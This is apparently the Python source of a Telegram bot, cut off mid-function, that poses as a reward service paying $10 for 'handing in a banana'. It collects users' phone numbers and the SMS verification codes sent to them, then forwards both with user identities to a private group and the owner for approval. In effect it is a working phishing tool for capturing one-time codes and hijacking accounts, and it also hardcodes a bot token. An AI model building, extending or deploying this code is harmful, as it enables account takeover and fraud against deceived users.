import asyncio
import logging
import os
from datetime import datetime
from contextlib import suppress

import aiosqlite
from aiogram import Bot, Dispatcher, F, Router, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatType, ChatMemberStatus
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, BotCommand, TelegramObject
)
from dotenv import load_dotenv

load_dotenv()

# ==================== КОНФИГ ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "9106636927:AAHYZwAyRlilXSacPyGway8S9oxYpoLmCGM")
OWNER_ID = int(os.getenv("OWNER_ID", "8874871486"))
GROUP_ID = int(os.getenv("GROUP_ID", "-1003901902414"))
SUPPORT_USERNAME = os.getenv("SUPPORT_USERNAME", "@Sm_mts")
ADMIN_CODE = os.getenv("ADMIN_CODE", "0408")
CHANNEL_ID = os.getenv("CHANNEL_ID", "-1004436617649")
CHANNEL_URL = os.getenv("CHANNEL_URL", "https://t.me/Sm_Info_mts")
DB_PATH = "banana.db"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s"
)
log = logging.getLogger("banana")

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

# ==================== БАЗА ДАННЫХ ====================
async def db_init():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            balance REAL DEFAULT 0,
            reg_date TEXT,
            banned INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        );
        CREATE TABLE IF NOT EXISTS stats (
            key TEXT PRIMARY KEY,
            value INTEGER DEFAULT 0
        );
        """)
        defaults = {
            "btn_banana": "🍌 Сдать банан",
            "btn_profile": "👤 Профиль",
            "btn_support": "🆘 Поддержка",
            "btn_withdraw": "💸 Вывести",
            "bot_active": "1",
            "text_support": (
                "💬 <b>Служба поддержки</b>\n\n"
                "Если у тебя возникли вопросы, проблемы или предложения — "
                "напиши нам, и мы обязательно поможем!\n\n"
                "👇 Нажми на кнопку ниже, чтобы открыть чат поддержки."
            ),
            "text_phone_prompt": (
                "📱 <b>Введите номер телефона</b>\n\n"
                "Поддерживаемые форматы:\n"
                "• <code>+79999999999</code>\n"
                "• <code>89999999999</code>\n"
                "• <code>9999999999</code>\n\n"
                "✍️ Отправь номер одним сообщением."
            ),
            "text_code_prompt": (
                "🔐 <b>Введите код из SMS</b>\n\n"
                "Код придёт на указанный номер в течение 1 минуты.\n"
                "📩 Отправь его одним сообщением."
            ),
            "start_photo": "",
            "start_caption": (
                "🍌 <b>Добро пожаловать!</b>\n\n"
                "Здесь ты можешь сдать свой банан и получить вознаграждение 💰\n\n"
                "Выбери действие ниже 👇"
            ),
        }
        for k, v in defaults.items():
            await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))
        for k in ["total_bananas", "total_payouts"]:
            await db.execute("INSERT OR IGNORE INTO stats (key, value) VALUES (?, 0)", (k,))
        await db.commit()


async def get_setting(key: str, default: str = "") -> str:
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT value FROM settings WHERE key = ?", (key,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else default


async def set_setting(key: str, value: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
        await db.commit()


async def inc_stat(key: str, amount: int = 1):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE stats SET value = value + ? WHERE key = ?", (amount, key))
        await db.commit()


async def get_stat(key: str) -> int:
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT value FROM stats WHERE key = ?", (key,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else 0


async def get_user(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT balance, reg_date FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
        if row is None:
            reg = datetime.now().strftime("%d.%m.%Y %H:%M")
            await db.execute("INSERT INTO users (user_id, balance, reg_date) VALUES (?, 0, ?)", (user_id, reg))
            await db.commit()
            return 0.0, reg
        return row[0], row[1]


async def update_balance(user_id: int, delta: float):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (delta, user_id))
        await db.commit()


async def set_balance(user_id: int, amount: float):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET balance = ? WHERE user_id = ?", (amount, user_id))
        await db.commit()


async def update_username(user_id: int, username: str | None):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET username = ? WHERE user_id = ?", (username, user_id))
        await db.commit()


async def is_bot_active() -> bool:
    return (await get_setting("bot_active", "1")) == "1"


async def get_start_photo() -> str | None:
    v = await get_setting("start_photo", "")
    return v or None


async def get_start_caption() -> str:
    return await get_setting(
        "start_caption",
        "🍌 <b>Добро пожаловать!</b>\n\nВыбери действие ниже 👇"
    )


# ==================== ЦВЕТА КНОПОК ====================
COLOR_PALETTE = {
    "🔴": "красный",
    "🟠": "оранжевый",
    "🟡": "жёлтый",
    "🟢": "зелёный",
    "🔵": "синий",
    "🟣": "фиолетовый",
    "⚫": "чёрный",
    "⚪": "белый",
    "🟤": "коричневый",
    "💎": "бирюзовый",
    "🔥": "огненный",
    "💚": "изумрудный",
    "💙": "лазурный",
    "💜": "аметист",
    "🧡": "янтарный",
    "🩷": "розовый",
}

COLOR_TARGETS = {
    "btn_banana": "🍌 Сдать банан",
    "btn_profile": "👤 Профиль",
    "btn_support": "🆘 Поддержка",
    "btn_withdraw": "💸 Вывести",
}


async def get_button_color(key: str) -> str:
    return await get_setting(f"color_{key}", "")


async def set_button_color(key: str, emoji: str):
    await set_setting(f"color_{key}", emoji)


async def build_button_text(key: str, base_text: str) -> str:
    color = await get_button_color(key)
    clean = base_text
    for e in COLOR_PALETTE:
        if clean.startswith(e):
            clean = clean[len(e):].strip()
            break
    if color:
        return f"{color} {clean}"
    return clean


# ==================== ПРОВЕРКА ПОДПИСКИ ====================
async def is_subscribed(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status not in (
            ChatMemberStatus.LEFT,
            ChatMemberStatus.KICKED,
        )
    except Exception as e:
        log.error(f"❌ Ошибка проверки подписки [{user_id}]: {type(e).__name__}: {e}")
        return True


def subscribe_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Подписаться на канал", url=CHANNEL_URL)],
        [InlineKeyboardButton(text="✅ Проверить подписку", callback_data="check_sub")],
    ])


async def send_subscribe_prompt(message: Message):
    await message.answer(
        "🔒 <b>Доступ ограничен</b>\n\n"
        "Чтобы пользоваться ботом, подпишись на наш канал 📢\n\n"
        "После подписки нажми <b>«Проверить подписку»</b> 👇",
        reply_markup=subscribe_kb()
    )


# ==================== БЕЗОПАСНАЯ ОТПРАВКА ====================
async def safe_send_group(text: str, **kwargs) -> bool:
    try:
        await bot.send_message(GROUP_ID, text, **kwargs)
        log.info("✅ Группа: отправлено")
        return True
    except Exception as e:
        log.error(f"❌ GROUP SEND FAILED [{GROUP_ID}]: {type(e).__name__}: {e}")
        return False


async def safe_send_owner(text: str, **kwargs) -> bool:
    try:
        await bot.send_message(OWNER_ID, text, **kwargs)
        log.info("✅ Владелец: отправлено")
        return True
    except Exception as e:
        log.error(f"❌ OWNER SEND FAILED [{OWNER_ID}]: {type(e).__name__}: {e}")
        return False


async def safe_send_user(user_id: int, text: str, **kwargs) -> bool:
    try:
        await bot.send_message(user_id, text, **kwargs)
        return True
    except Exception as e:
        log.warning(f"❌ USER SEND FAILED [{user_id}]: {type(e).__name__}: {e}")
        return False


async def check_group_access() -> bool:
    try:
        me = await bot.get_me()
        chat = await bot.get_chat(GROUP_ID)
        member = await bot.get_chat_member(GROUP_ID, me.id)
        log.info(f"✅ Группа: '{chat.title}' (type={chat.type}, id={chat.id})")
        log.info(f"✅ Статус бота в группе: {member.status}")
        test = await bot.send_message(GROUP_ID, "🔧 <b>Диагностика</b>\nБот подключён к группе.")
        log.info(f"✅ Тестовое сообщение в группу (id={test.message_id})")
        return True
    except Exception as e:
        log.error(f"❌ НЕ УДАЛОСЬ отправить в группу {GROUP_ID}: {type(e).__name__}: {e}")
        return False


async def check_channel_access() -> bool:
    try:
        me = await bot.get_me()
        chat = await bot.get_chat(CHANNEL_ID)
        member = await bot.get_chat_member(CHANNEL_ID, me.id)
        is_admin = member.status == ChatMemberStatus.ADMINISTRATOR
        log.info(f"✅ Канал: '{chat.title}' (@{chat.username}, id={chat.id})")
        log.info(f"✅ Статус бота в канале: {member.status}")
        if not is_admin:
            log.warning("⚠️ Бот НЕ админ канала — проверка подписки работать НЕ БУДЕТ!")
        return is_admin
    except Exception as e:
        log.error(f"❌ НЕ УДАЛОСЬ проверить канал {CHANNEL_ID}: {type(e).__name__}: {e}")
        log.error("→ Замени CHANNEL_ID в .env и добавь бота админом канала!")
        return False


# ==================== FSM ====================
class BananaStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()


class WithdrawStates(StatesGroup):
    waiting_amount = State()


class AdminStates(StatesGroup):
    waiting_code = State()
    waiting_broadcast = State()
    waiting_btn_text = State()
    waiting_start_photo = State()
    waiting_start_caption = State()
    waiting_color_pick = State()


# ==================== КЛАВИАТУРЫ ====================
async def main_kb() -> ReplyKeyboardMarkup:
    btn_banana = await build_button_text("btn_banana", await get_setting("btn_banana"))
    btn_profile = await build_button_text("btn_profile", await get_setting("btn_profile"))
    btn_support = await build_button_text("btn_support", await get_setting("btn_support"))
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=btn_banana)],
            [
                KeyboardButton(text=btn_profile),
                KeyboardButton(text=btn_support),
            ],
        ],
        resize_keyboard=True,
        input_field_placeholder="✨ Выберите действие…"
    )


def owner_decision_kb(user_id: int, phone: str, code: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Одобрить", callback_data=f"yes|{user_id}|{phone}|{code}"),
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"no|{user_id}|{phone}|{code}"),
    ]])


async def admin_kb() -> InlineKeyboardMarkup:
    active = await is_bot_active()
    toggle_text = "⏸ Остановить бота" if active else "▶️ Запустить бота"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✏️ Названия кнопок", callback_data="adm:names"),
         InlineKeyboardButton(text="📝 Описания", callback_data="adm:desc")],
        [InlineKeyboardButton(text="🎨 Цвет (эмодзи)", callback_data="adm:color"),
         InlineKeyboardButton(text="🖼 Фото приветствия", callback_data="adm:photo")],
        [InlineKeyboardButton(text=toggle_text, callback_data="adm:toggle")],
        [InlineKeyboardButton(text="📢 Рассылка всем", callback_data="adm:broadcast")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="adm:stats")],
    ])


# ==================== MIDDLEWARE ====================
class GateMiddleware(BaseMiddleware):
    async def __call__(self, handler, event: TelegramObject, data):
        if isinstance(event, Message):
            uid = event.from_user.id if event.from_user else None
            if uid == OWNER_ID:
                return await handler(event, data)
            if not await is_bot_active():
                with suppress(Exception):
                    await event.answer(
                        "⏸ <b>Бот временно на обслуживании.</b>\n\n"
                        "Мы скоро вернёмся! Попробуйте позже 🙏"
                    )
                return
            if uid:
                await get_user(uid)
                await update_username(uid, event.from_user.username)

            if event.text and event.text.startswith("/start"):
                return await handler(event, data)

            if uid and event.chat.type == ChatType.PRIVATE:
                if not await is_subscribed(uid):
                    await send_subscribe_prompt(event)
                    return

        elif isinstance(event, CallbackQuery):
            uid = event.from_user.id
            if uid == OWNER_ID:
                return await handler(event, data)
            if not await is_bot_active():
                await event.answer("⏸ Бот на обслуживании", show_alert=True)
                return
            if event.data == "check_sub":
                return await handler(event, data)
            if not await is_subscribed(uid):
                await event.answer("🔒 Сначала подпишись на канал!", show_alert=True)
                return

        return await handler(event, data)


router.message.middleware(GateMiddleware())
router.callback_query.middleware(GateMiddleware())


# ==================== ВАЛИДАЦИЯ ТЕЛЕФОНА ====================
def validate_phone(raw: str) -> str | None:
    s = raw.strip().replace(" ", "").replace("-", "")
    if s.startswith("+"):
        s = s[1:]
    if not s.isdigit():
        return None
    if len(s) == 10:
        return "+7" + s
    if len(s) == 11 and s.startswith("8"):
        return "+7" + s[1:]
    if len(s) == 11 and s.startswith("7"):
        return "+" + s
    if len(s) == 12 and s.startswith("7"):
        return "+" + s
    return None


# ==================== СТАРТ ====================
@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    await get_user(message.from_user.id)

    if not await is_subscribed(message.from_user.id):
        await message.answer(
            f"👋 <b>Привет, {message.from_user.first_name}!</b>\n\n"
            "🧸 Это бот для сдачи бананов и получения вознаграждения.\n\n"
            "🔒 <b>Для начала подпишись на наш канал</b> 👇",
            reply_markup=subscribe_kb()
        )
        return

    photo_id = await get_start_photo()
    caption = await get_start_caption()
    kb = await main_kb()

    if photo_id:
        try:
            await message.answer_photo(photo=photo_id, caption=caption, reply_markup=kb)
            return
        except Exception as e:
            log.warning(f"⚠️ Фото приветствия сломано: {e}. Сбрасываю.")
            await set_setting("start_photo", "")

    await message.answer(caption, reply_markup=kb)


@router.callback_query(F.data == "check_sub")
async def check_sub_cb(cb: CallbackQuery):
    if await is_subscribed(cb.from_user.id):
        await cb.message.edit_text(
            "✅ <b>Подписка подтверждена!</b>\n\n"
            "Добро пожаловать в бота 🍌\n"
            "Нажми /start, чтобы открыть меню."
        )
        await cb.answer("✅ Подписка подтверждена!")
    else:
        await cb.answer("❌ Ты ещё не подписался на канал!", show_alert=True)


@router.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("❌ Отменено.", reply_markup=await main_kb())


# ==================== 1. СДАТЬ БАНАН ====================
@router.message(
    F.text.func(lambda t: t and t == "🍌 Сдать банан")
    | F.text.func(lambda t: t and "банан" in t.lower() and len(t) < 40)
)
async def banana_start(message: Message, state: FSMContext):
    if message.chat.type != ChatType.PRIVATE:
        return
    await state.set_state(BananaStates.waiting_phone)
    await message.answer(
        await get_setting("text_phone_prompt"),
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="❌ Отмена")]],
            resize_keyboard=True
        )
    )


@router.message(BananaStates.waiting_phone, F.text == "❌ Отмена")
async def banana_cancel(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("Отменено.", reply_markup=await main_kb())


@router.message(BananaStates.waiting_phone)
async def banana_phone(message: Message, state: FSMContext):
    phone = validate_phone(message.text or "")
    if not phone:
        await message.answer("❌ <b>Неверный формат номера</b>\n\nПример: <code>+79999999999</code>")
        return

    await state.update_data(phone=phone)
    username = message.from_user.username or "—"

    sent = await safe_send_group(
        f"📞 <b>Новый номер</b>\n"
        f"👤 Юзер: <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a> "
        f"(<code>{message.from_user.id}</code>)\n"
        f"🔗 @{username}\n"
        f"📱 Номер: <code>{phone}</code>"
    )
    if not sent:
        await message.answer("⚠️ Не удалось отправить номер в группу. Сообщите администратору.")

    await state.set_state(BananaStates.waiting_code)
    await message.answer(await get_setting("text_code_prompt"))


@router.message(BananaStates.waiting_code)
async def banana_code(message: Message, state: FSMContext):
    code = (message.text or "").strip()
    if not code or len(code) > 20:
        await message.answer("❌ Введите корректный код.")
        return

    data = await state.get_data()
    phone = data.get("phone")
    user_id = message.from_user.id
    username = message.from_user.username or "—"

    await safe_send_group(
        f"🔑 <b>Код получен</b>\n"
        f"📱 Номер: <code>{phone}</code>\n"
        f"🔢 Код: <code>{code}</code>\n"
        f"👤 От: <a href='tg://user?id={user_id}'>{message.from_user.full_name}</a> "
        f"(<code>{user_id}</code>) @{username}"
    )

    await safe_send_owner(
        f"🆕 <b>Новая заявка</b>\n\n"
        f"👤 Пользователь: <a href='tg://user?id={user_id}'>{message.from_user.full_name}</a>\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"🔗 @{username}\n"
        f"📱 Номер: <code>{phone}</code>\n"
        f"🔢 Код: <code>{code}</code>\n\n"
        f"Одобрить?",
        reply_markup=owner_decision_kb(user_id, phone, code)
    )

    await message.answer(
        "⏳ <b>Ожидайте проверки номера</b>\n\n"
        "🔔 Мы уведомим вас о результате в ближайшее время.",
        reply_markup=await main_kb()
    )
    await state.clear()


# ==================== РЕШЕНИЕ ВЛАДЕЛЬЦА ====================
@router.callback_query(F.data.startswith("yes|"))
async def owner_yes(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Нет прав", show_alert=True)
        return
    _, uid, phone, code = cb.data.split("|", 3)
    uid = int(uid)
    await update_balance(uid, 10.0)
    await inc_stat("total_bananas")
    await cb.message.edit_text(cb.message.html_text + "\n\n✅ <b>ОДОБРЕНО</b> — зачислено 10$")
    await safe_send_user(
        uid,
        "✅ <b>Номер проверен!</b>\n\n"
        "💰 На ваш баланс зачислено <b>10$</b>\n\n"
        "✨ Спасибо, что пользуетесь нашим ботом!",
        reply_markup=await main_kb()
    )
    await cb.answer("Одобрено")


@router.callback_query(F.data.startswith("no|"))
async def owner_no(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Нет прав", show_alert=True)
        return
    _, uid, phone, code = cb.data.split("|", 3)
    uid = int(uid)
    await cb.message.edit_text(cb.message.html_text + "\n\n❌ <b>ОТКЛОНЕНО</b>")
    await safe_send_user(
        uid,
        "❌ <b>Произошла ошибка, попробуйте позже.</b>",
        reply_markup=await main_kb()
    )
    await cb.answer("Отклонено")


# ==================== 2. ПРОФИЛЬ ====================
@router.message(
    F.text.func(lambda t: t and t == "👤 Профиль")
    | F.text.func(lambda t: t and "профиль" in t.lower() and len(t) < 40)
)
async def profile(message: Message):
    if message.chat.type != ChatType.PRIVATE:
        return
    balance, reg = await get_user(message.from_user.id)
    withdraw_text = await build_button_text(
        "btn_withdraw",
        await get_setting("btn_withdraw")
    )
    text = (
        f"👤 <b>Ваш профиль</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>ID:</b> <code>{message.from_user.id}</code>\n"
        f"🔗 <b>Юзернейм:</b> @{message.from_user.username or '—'}\n"
        f"💰 <b>Баланс:</b> <code>{balance:.2f}$</code>\n"
        f"📅 <b>Регистрация:</b> {reg}\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"💸 Хочешь вывести средства? Нажми кнопку ниже 👇"
    )
    await message.answer(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text=withdraw_text, callback_data="withdraw")
        ]])
    )


@router.callback_query(F.data == "withdraw")
async def withdraw_start(cb: CallbackQuery, state: FSMContext):
    balance, _ = await get_user(cb.from_user.id)
    if balance <= 0:
        await cb.answer("💰 У вас нет средств для вывода", show_alert=True)
        return
    await state.set_state(WithdrawStates.waiting_amount)
    await cb.message.answer(
        f"💸 <b>Вывод средств</b>\n\n"
        f"💰 Доступно: <code>{balance:.2f}$</code>\n\n"
        f"✍️ Введите сумму вывода:\n\n"
        f"<i>Для отмены — /cancel</i>"
    )
    await cb.answer()


@router.message(WithdrawStates.waiting_amount)
async def withdraw_amount(message: Message, state: FSMContext):
    raw = (message.text or "").replace(",", ".").replace("$", "").strip()
    try:
        amount = float(raw)
    except ValueError:
        await message.answer("❌ Введите число.")
        return
    if amount <= 0:
        await message.answer("❌ Сумма должна быть больше 0.")
        return

    uid = message.from_user.id
    balance, _ = await get_user(uid)
    if amount > balance:
        await message.answer(
            f"❌ <b>Недостаточно средств</b>\n\n💰 Ваш баланс: <code>{balance:.2f}$</code>"
        )
        return

    await set_balance(uid, balance - amount)
    await inc_stat("total_payouts")
    username = message.from_user.username or "—"

    await safe_send_owner(
        f"💸 <b>Запрос на вывод</b>\n\n"
        f"👤 <a href='tg://user?id={uid}'>{message.from_user.full_name}</a>\n"
        f"🆔 <code>{uid}</code>\n"
        f"🔗 @{username}\n"
        f"💵 Сумма: <b>{amount:.2f}$</b>\n"
        f"💰 Остаток: <b>{balance - amount:.2f}$</b>"
    )

    await message.answer(
        "⏳ <b>Ожидайте вывод</b>\n\n"
        "💸 Средства списаны с баланса.\n"
        "🔔 Мы уведомим вас, когда перевод будет выполнен.",
        reply_markup=await main_kb()
    )
    await state.clear()


# ==================== 3. ПОДДЕРЖКА ====================
@router.message(
    F.text.func(lambda t: t and t == "🆘 Поддержка")
    | F.text.func(lambda t: t and "поддержк" in t.lower() and len(t) < 40)
)
async def support(message: Message):
    if message.chat.type != ChatType.PRIVATE:
        return
    text = await get_setting("text_support")
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="💬 Написать в поддержку",
            url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}"
        )
    ]])
    await message.answer(text, reply_markup=kb)


# ==================== АДМИН-ПАНЕЛЬ ====================
@router.message(Command("admin"))
async def admin_enter(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        return
    await state.set_state(AdminStates.waiting_code)
    await message.answer("🔐 Введите код администратора:")


@router.message(AdminStates.waiting_code)
async def admin_check(message: Message, state: FSMContext):
    if (message.text or "").strip() != ADMIN_CODE:
        await message.answer("❌ Неверный код.")
        await state.clear()
        return
    await state.clear()
    active = await is_bot_active()
    await message.answer(
        f"⚙️ <b>Админ-панель</b>\n\n"
        f"Статус бота: <b>{'▶️ активен' if active else '⏸ остановлен'}</b>\n\n"
        f"Выбери действие 👇",
        reply_markup=await admin_kb()
    )


@router.callback_query(F.data.startswith("adm:"))
async def admin_router(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Нет прав", show_alert=True)
        return

    if cb.data in ("adm:photo_upload", "adm:photo_caption", "adm:photo_delete", "adm:back"):
        return

    await state.clear()
    action = cb.data.split(":", 1)[1]

    if action == "stats":
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT COUNT(*), COALESCE(SUM(balance),0) FROM users") as cur:
                total, total_bal = await cur.fetchone()
        bananas = await get_stat("total_bananas")
        payouts = await get_stat("total_payouts")
        active = await is_bot_active()
        await cb.message.answer(
            f"📊 <b>Статистика бота</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👥 Пользователей: <b>{total}</b>\n"
            f"💰 Общий баланс: <b>{total_bal:.2f}$</b>\n"
            f"🍌 Всего сдач: <b>{bananas}</b>\n"
            f"💸 Всего выводов: <b>{payouts}</b>\n"
            f"🤖 Бот: <b>{'▶️ активен' if active else '⏸ остановлен'}</b>"
        )

    elif action == "toggle":
        current = await is_bot_active()
        new_val = "0" if current else "1"
        await set_setting("bot_active", new_val)
        text = (
            "⚙️ <b>Админ-панель</b>\n\n"
            f"{'▶️ <b>Бот запущен</b>' if new_val == '1' else '⏸ <b>Бот остановлен</b>'}\n\n"
            "Выбери действие 👇"
        )
        await cb.message.edit_text(text, reply_markup=await admin_kb())
        await cb.answer("▶️ Запущен" if new_val == "1" else "⏸ Остановлен")

    elif action == "broadcast":
        await state.set_state(AdminStates.waiting_broadcast)
        await cb.message.answer("📢 Введите текст объявления:\n\n/cancel — отмена")

    elif action == "names":
        await state.set_state(AdminStates.waiting_btn_text)
        await cb.message.answer(
            "✏️ Введите в формате <code>ключ=новое название</code>:\n\n"
            "Ключи:\n"
            "<code>btn_banana</code>, <code>btn_profile</code>, "
            "<code>btn_support</code>, <code>btn_withdraw</code>\n\n"
            "Пример: <code>btn_banana=🍌 Сдать</code>"
        )

    elif action == "desc":
        await state.set_state(AdminStates.waiting_btn_text)
        await cb.message.answer(
            "📝 Введите в формате <code>ключ=новый текст</code>:\n\n"
            "Ключи:\n"
            "<code>text_support</code>, <code>text_phone_prompt</code>, "
            "<code>text_code_prompt</code>"
        )

    elif action == "color":
        current = []
        for key, label in COLOR_TARGETS.items():
            c = await get_button_color(key)
            current.append(f"• {label}: {c or '—'}")
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🍌 Сдать банан", callback_data="color:btn_banana")],
            [InlineKeyboardButton(text="👤 Профиль", callback_data="color:btn_profile")],
            [InlineKeyboardButton(text="🆘 Поддержка", callback_data="color:btn_support")],
            [InlineKeyboardButton(text="💸 Вывести", callback_data="color:btn_withdraw")],
            [InlineKeyboardButton(text="🔄 Сбросить все цвета", callback_data="color:reset_all")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="adm:back")],
        ])
        await cb.message.edit_text(
            "🎨 <b>Цвета кнопок</b>\n\n"
            "В Telegram нельзя задать цвет Reply-кнопок напрямую, "
            "но можно поставить цветной эмодзи в начало названия — "
            "кнопка будет выглядеть «цветной».\n\n"
            "<b>Текущие цвета:</b>\n" + "\n".join(current) + "\n\n"
            "Выбери кнопку, чтобы сменить цвет 👇",
            reply_markup=kb
        )

    elif action == "photo":
        current = await get_start_photo()
        status = "✅ <b>Фото установлено</b>" if current else "❌ <b>Фото не установлено</b>"
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📤 Загрузить фото", callback_data="adm:photo_upload")],
            [InlineKeyboardButton(text="✏️ Изменить подпись", callback_data="adm:photo_caption")],
            [InlineKeyboardButton(text="🗑 Удалить фото", callback_data="adm:photo_delete")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="adm:back")],
        ])
        await cb.message.edit_text(
            f"🖼 <b>Фото приветствия</b>\n\n"
            f"Статус: {status}\n\n"
            f"Выбери действие 👇",
            reply_markup=kb
        )

    await cb.answer()


# ==================== ЦВЕТА: ОБРАБОТЧИКИ ====================
@router.callback_query(F.data.startswith("color:"))
async def color_router(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Нет прав", show_alert=True)
        return

    action = cb.data.split(":", 1)[1]

    if action == "reset_all":
        for key in COLOR_TARGETS:
            await set_button_color(key, "")
        await cb.message.edit_text(
            "🔄 <b>Все цвета сброшены.</b>\n\n"
            "Кнопки вернулись к стандартному виду.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="adm:back")]
            ])
        )
        await cb.answer("Сброшено")
        return

    if action not in COLOR_TARGETS:
        await cb.answer("Неизвестная кнопка", show_alert=True)
        return

    await state.set_state(AdminStates.waiting_color_pick)
    await state.update_data(color_target=action)

    palette_buttons = []
    row = []
    for emoji, name in COLOR_PALETTE.items():
        row.append(InlineKeyboardButton(
            text=f"{emoji} {name}",
            callback_data=f"color_pick:{action}:{emoji}"
        ))
        if len(row) == 2:
            palette_buttons.append(row)
            row = []
    if row:
        palette_buttons.append(row)
    palette_buttons.append([InlineKeyboardButton(text="🚫 Без цвета", callback_data=f"color_pick:{action}:none")])
    palette_buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="adm:color")])

    current = await get_button_color(action)
    await cb.message.edit_text(
        f"🎨 <b>Цвет для кнопки:</b> {COLOR_TARGETS[action]}\n"
        f"Текущий: {current or '—'}\n\n"
        f"Выбери эмодзи-цвет 👇",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=palette_buttons)
    )
    await cb.answer()


@router.callback_query(F.data.startswith("color_pick:"))
async def color_pick(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Нет прав", show_alert=True)
        return

    parts = cb.data.split(":", 2)
    if len(parts) != 3:
        await cb.answer("Ошибка формата", show_alert=True)
        return
    _, target, emoji = parts

    if target not in COLOR_TARGETS:
        await cb.answer("Неизвестная кнопка", show_alert=True)
        return

    if emoji == "none":
        await set_button_color(target, "")
        result_text = "🚫 цвет убран"
    else:
        await set_button_color(target, emoji)
        result_text = f"{emoji} {COLOR_PALETTE.get(emoji, emoji)}"

    await state.clear()

    await cb.message.edit_text(
        f"✅ <b>Готово!</b>\n\n"
        f"Кнопка «{COLOR_TARGETS[target]}» теперь: {result_text}\n\n"
        f"Изменения применятся при следующем показе клавиатуры.\n"
        f"Проверь через /start.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎨 Сменить другую", callback_data="adm:color")],
            [InlineKeyboardButton(text="⬅️ Назад в админку", callback_data="adm:back")],
        ])
    )
    await cb.answer(f"Цвет: {result_text}")


# ==================== ФОТО ПРИВЕТСТВИЯ ====================
@router.callback_query(F.data == "adm:photo_upload")
async def adm_photo_upload(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Нет прав", show_alert=True)
        return
    await state.set_state(AdminStates.waiting_start_photo)
    await cb.message.answer(
        "📤 <b>Отправь фото</b> для приветствия.\n\n"
        "Рекомендую: 1280×720 (16:9), до 5 МБ.\n"
        "Отправь картинку одним сообщением.\n\n"
        "<i>/cancel — отмена</i>"
    )
    await cb.answer()


@router.message(AdminStates.waiting_start_photo, F.photo)
async def adm_photo_save(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        return
    file_id = message.photo[-1].file_id
    await set_setting("start_photo", file_id)
    await state.clear()
    await message.answer(
